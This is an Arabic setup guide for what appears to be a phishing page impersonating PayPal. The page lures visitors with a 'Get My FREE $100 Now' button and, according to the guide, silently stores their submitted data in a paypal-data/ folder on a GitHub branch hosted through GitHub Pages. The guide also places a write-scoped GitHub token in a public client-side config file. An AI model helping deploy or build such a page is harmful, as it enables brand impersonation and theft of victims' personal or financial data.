# 🚀 إعداد سريع لحفظ البيانات في GitHub

## ⚡ خطوات سريعة:

### 1. 🔑 إنشاء Personal Access Token:
1. GitHub.com → Settings → Developer settings → Personal access tokens
2. Generate new token (classic)
3. اختر صلاحيات: **repo** و **workflow**
4. انسخ Token (مثل: `ghp_xxxxxxxxxxxx`)

### 2. ⚙️ تحديث ملف `github-config.js`:
```javascript
const GITHUB_CONFIG = {
    owner: 'your-actual-username',      // اسمك في GitHub
    repo: 'your-actual-repo-name',      // اسم المستودع
    token: 'ghp_your_actual_token',     // Token الذي نسخته
    // ... باقي الإعدادات
};
```

### 3. 🌿 إنشاء فرع البيانات:
```bash
git checkout -b data-storage
git push origin data-storage
```

### 4. 🚀 رفع المشروع:
```bash
git add .
git commit -m "PayPal Landing Page مع حفظ البيانات"
git remote add origin https://github.com/username/repo-name.git
git push -u origin main
```

### 5. 🎯 تفعيل GitHub Pages:
- Settings → Pages → Deploy from branch → main

## ✅ النتيجة:
عند الضغط على "Get My FREE $100 Now":
- البيانات تُحفظ في فرع `data-storage`
- في مجلد `paypal-data/`
- لا ينزل أي ملف للمستخدم

## 📍 مهم جداً:
**يجب تحديث `github-config.js` بمعلوماتك الحقيقية وإلا لن يعمل النظام!**
